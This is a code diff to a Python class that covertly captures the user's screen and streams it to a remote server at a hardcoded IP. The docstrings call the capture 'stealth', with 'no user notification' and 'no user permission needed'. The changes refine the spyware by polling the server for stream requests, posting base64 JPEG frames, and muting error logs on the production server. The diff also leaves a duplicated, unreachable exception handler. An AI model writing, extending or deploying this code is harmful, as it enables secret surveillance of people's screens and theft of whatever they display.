@@ -70,6 +70,14 @@ class StreamHandler:
     def check_stream_requests(self):
         """Check server for streaming requests (stealth - no user notification)"""
         try:
+            # Check if this is production server
+            is_production = '103.129.149.67' in self.api_client.server_url
+            
+            if is_production:
+                # Production server - streaming not implemented yet
+                # Just return without error to avoid spam logs
+                return False
+            
             response = requests.get(
                 f"{Config.SERVER_URL}/api/stream/request/{Config.CLIENT_ID}",
                 timeout=10
@@ -84,69 +92,97 @@ class StreamHandler:
                     self.is_streaming = True
                     logging.info(f"Starting stealth stream with quality: {self.stream_quality}")
                     self.start_stealth_streaming()
+                    return True
                     
                 elif not data.get('quality') and self.is_streaming:
                     # Stop streaming
                     self.is_streaming = False
                     logging.info("Stopping stealth stream")
                     self.stop_stealth_streaming()
+                    return False
                     
+        except requests.RequestException:
+            # Network errors are common, don't spam logs
+            pass
         except Exception as e:
-            logging.error(f"Error checking stream requests: {e}")
+            # Only log errors for local development
+            is_production = '103.129.149.67' in self.api_client.server_url
+            if not is_production:
+                logging.error(f"Error checking stream requests: {e}")
+        
+        return False
             
     def start_stealth_streaming(self):
         """Start stealth screen streaming using Python libraries (no user permission needed)"""
         try:
-            import mss
-            from PIL import Image
-            import io
-            
             def stream_worker():
                 """Worker thread for stealth streaming"""
-                fps = self.stream_settings[self.stream_quality]['fps']
-                frame_interval = 1.0 / fps
-                
-                with mss.mss() as sct:
-                    # Get primary monitor
-                    monitor = sct.monitors[1]
+                try:
+                    # Check if mss is available
+                    import mss
+                    from PIL import Image
+                    import io
                     
-                    while self.is_streaming:
-                        try:
-                            # Capture screenshot (stealth - no notification)
-                            screenshot = sct.grab(monitor)
-                            
-                            # Convert to PIL Image
-                            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
-                            
-                            # Resize based on quality
-                            quality_settings = self.stream_settings[self.stream_quality]
-                            if 'scale' in quality_settings:
-                                width = int(quality_settings['scale'].split(':')[1])
-                                if width != img.height:
-                                    ratio = width / img.height
-                                    new_width = int(img.width * ratio)
-                                    img = img.resize((new_width, width), Image.Resampling.LANCZOS)
-                            
-                            # Convert to JPEG with compression
-                            img_buffer = io.BytesIO()
-                            quality = 85 if self.stream_quality == 'high' else 70 if self.stream_quality == 'medium' else 50
-                            img.save(img_buffer, format='JPEG', quality=quality, optimize=True)
-                            
-                            # Encode to base64
-                            img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
-                            
-                            # Send to server
-                            self.send_stream_chunk(img_data)
-                            
-                            time.sleep(frame_interval)
-                            
-                        except Exception as e:
-                            logging.error(f"Stealth streaming error: {e}")
-                            time.sleep(1)
+                    fps = self.stream_settings[self.stream_quality]['fps']
+                    frame_interval = 1.0 / fps
+                    
+                    with mss.mss() as sct:
+                        # Get primary monitor
+                        monitor = sct.monitors[1]
+                        
+                        while self.is_streaming:
+                            try:
+                                # Capture screenshot (stealth - no notification)
+                                screenshot = sct.grab(monitor)
+                                
+                                # Convert to PIL Image
+                                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                                
+                                # Resize based on quality
+                                quality_settings = self.stream_settings[self.stream_quality]
+                                if 'scale' in quality_settings:
+                                    width = int(quality_settings['scale'].split(':')[1])
+                                    if width != img.height:
+                                        ratio = width / img.height
+                                        new_width = int(img.width * ratio)
+                                        img = img.resize((new_width, width), Image.Resampling.LANCZOS)
+                                
+                                # Convert to JPEG with compression
+                                img_buffer = io.BytesIO()
+                                quality = 85 if self.stream_quality == 'high' else 70 if self.stream_quality == 'medium' else 50
+                                img.save(img_buffer, format='JPEG', quality=quality, optimize=True)
+                                
+                                # Encode to base64
+                                img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
+                                
+                                # Send to server
+                                self.send_stream_chunk(img_data)
+                                
+                                time.sleep(frame_interval)
+                                
+                            except Exception as frame_error:
+                                logging.error(f"Frame capture error: {frame_error}")
+                                time.sleep(1)
+                                
+                except ImportError as import_error:
+                    logging.error(f"Required libraries not available for streaming: {import_error}")
+                    self.is_streaming = False
+                except Exception as worker_error:
+                    logging.error(f"Stream worker error: {worker_error}")
+                    self.is_streaming = False
                             
             # Start streaming thread
+            if hasattr(self, 'stream_thread') and self.stream_thread.is_alive():
+                logging.warning("Stream thread already running")
+                return
+                
             self.stream_thread = threading.Thread(target=stream_worker, daemon=True)
             self.stream_thread.start()
+            logging.info(f"Stealth streaming started with quality: {self.stream_quality}")
+            
+        except Exception as e:
+            logging.error(f"Failed to start stealth streaming: {e}")
+            self.is_streaming = False
             
         except Exception as e:
             logging.error(f"Failed to start stealth streaming: {e}")
@@ -160,23 +196,38 @@ class StreamHandler:
     def send_stream_chunk(self, img_data):
         """Send stream chunk to server"""
         try:
+            # Check if this is production server
+            is_production = '103.129.149.67' in self.api_client.server_url
+            
+            if is_production:
+                # Production server - streaming not implemented yet
+                logging.debug("Streaming not available on production server")
+                return False
+            
             chunk_data = {
-                'chunk': img_data,
-                'sequence': self.sequence,
-                'timestamp': datetime.now().isoformat(),
-                'client_id': Config.CLIENT_ID
+                'client_id': Config.CLIENT_ID,
+                'frame_data': img_data,
+                'timestamp': time.time(),
+                'quality': self.stream_quality
             }
             
-            response = self.api_client.post(f'/api/stream/chunk/{Config.CLIENT_ID}', chunk_data)
+            response = requests.post(
+                f"{Config.SERVER_URL}/api/stream/chunk",
+                json=chunk_data,
+                timeout=5
+            )
             
-            if response:
-                self.sequence += 1
-                logging.debug(f"Stream chunk {self.sequence} sent successfully")
-            else:
-                logging.debug(f"Failed to send stream chunk {self.sequence}")
-                
+            return response.status_code == 200
+            
+        except requests.RequestException:
+            # Network errors are common during streaming
+            return False
         except Exception as e:
-            logging.debug(f"Error sending stream chunk: {str(e)}")
+            # Only log errors for local development
+            is_production = '103.129.149.67' in self.api_client.server_url
+            if not is_production:
+                logging.error(f"Error sending stream chunk: {e}")
+            return False
             
     def start_ffmpeg_stream(self):
         """Start FFmpeg screen capture and streaming"""
